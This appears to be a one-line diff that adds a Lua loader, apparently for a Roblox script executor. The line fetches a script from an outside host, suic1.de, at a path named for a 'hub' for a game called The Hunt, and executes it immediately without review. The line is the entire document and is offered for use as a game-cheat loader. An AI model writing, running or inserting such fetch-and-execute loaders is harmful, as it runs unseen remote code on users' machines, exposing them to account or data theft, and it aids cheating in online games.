@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://suic1.de/the-hunt-20-hub"))()
